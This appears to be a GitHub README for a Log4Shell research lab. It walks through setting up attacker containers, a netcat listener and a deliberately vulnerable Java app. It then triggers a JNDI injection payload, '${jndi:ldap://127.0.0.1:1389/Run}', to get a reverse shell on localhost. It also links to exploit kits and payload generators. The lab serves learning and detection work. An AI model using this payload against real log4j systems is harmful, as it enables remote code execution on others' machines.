# Log4Shell Research Lab 🚧

A basic research lab to learn more about `Log4Shell`:
* [CVE-2021-45105](https://logging.apache.org/log4j/2.x/security.html#CVE-2021-45105)
* [CVE-2021-45046](https://logging.apache.org/log4j/2.x/security.html#CVE-2021-45046)
* [CVE-2021-44228](https://logging.apache.org/log4j/2.x/security.html#CVE-2021-44228)

## Used By

* [Microsoft Sentinel To-Go! Log4Shell Demo](https://github.com/OTRF/Microsoft-Sentinel2Go/tree/master/grocery-list/Linux/demos/CVE-2021-44228-Log4Shell)

## Research notes

* I took the [following notes](research-notes/README.md) while learning about `Log4Shell`. I hope they are helpful! 🍻.
* Depending on which CVE you want to test, use the following research notes to simulate a few scenarios:
    * [CVE-2021-44228 Simulation](research-notes/2021-12-11_01-CVE-2021-44228-simulation.md)
    * [CVE-2021-45046 Simulation](research-notes/2022-01-03_01-CVE-2021-45046-simulation.md)

## A Basic POC - CVE-2021-44228

### Clone Repo

```
sudo su
git clone https://github.com/Cyb3rWard0g/log4jshell-lab
```

### Install Docker

```bash
wget https://raw.githubusercontent.com/OTRF/Blacksmith/master/resources/scripts/bash/Install-Docker.sh
chmod +x Install-Docker.sh

./Install-Docker.sh
```

### Run Docker Compose File

```
cd log4jshell-lab/attacker
docker-compose -f MarshalsecLDAP-NginxWebServer.yml up --build -d
```

### Check Docker Containers

```
docker ps

docker logs --follow ldap-server
docker logs --follow web-server
```

## Trigger CVE-2021-44228

This scenario simulates an attacker using the log4j [CVE-2021-44228](https://logging.apache.org/log4j/2.x/security.html#CVE-2021-44228) RCE vulnerability to get a shell locally (127.0.0.1) via netcat.
We are going to execute everything on the same endpoint where we deployed our attacker's infrastructure.

### Start Netcat Server

```
nc -lvnp 443
```

### Compile Vulnerable Java Application

**Docker**
```
cd log4jshell-lab/victim/vuln-apps/others/basicJar

docker run -it --rm -v "$(pwd)":/opt/maven -w /opt/maven maven mvn clean install
```

**Manually**
```
cd log4jshell-lab/victim/vuln-apps/others/basicJar
mvn -f pom.xml clean package -DskipTests
```

### Run Application

```
java -cp target/Log4jLabProject-1.0-SNAPSHOT-all.jar com.log4jshell.App '${jndi:ldap://127.0.0.1:1389/Run}'
```

![](resources/images/log4jshell-trigger-rce-basicjar-reverseshell3.png)

## Security Datasets

* [Basic JNDI Lookup PCAP](https://securitydatasets.com/notebooks/atomic/linux/initial_access/SDLIN-211214154100.html)

## References
* https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf
* https://www.youtube.com/watch?v=Y8a5nB-vy78
* https://github.com/veracode-research/rogue-jndi
* https://community.microfocus.com/cyberres/fortify/f/fortify-discussions/317555/the-perils-of-java-deserialization
* https://www.veracode.com/blog/research/exploiting-jndi-injections-java
* https://github.com/pimps/JNDI-Exploit-Kit
* https://github.com/pimps/ysoserial-modified
* https://ldap.com/ldap-urls/
* https://github.com/pwntester/SerialKillerBypassGadgetCollection
* https://www.ibm.com/docs/en/content-manager/8.5.0?topic=ldap-server-configuration-storing-java-objects
* https://docs.microsoft.com/en-us/windows/win32/ad/enabling-schema-changes-at-the-schema-master
* https://forensicitguy.github.io/analyzing-log4shell-muhstik/
* https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/fromCharCode
* https://www.jackson-t.ca/runtime-exec-payloads.html
* https://github.com/woodpecker-appstore/log4j-payload-generator/tree/master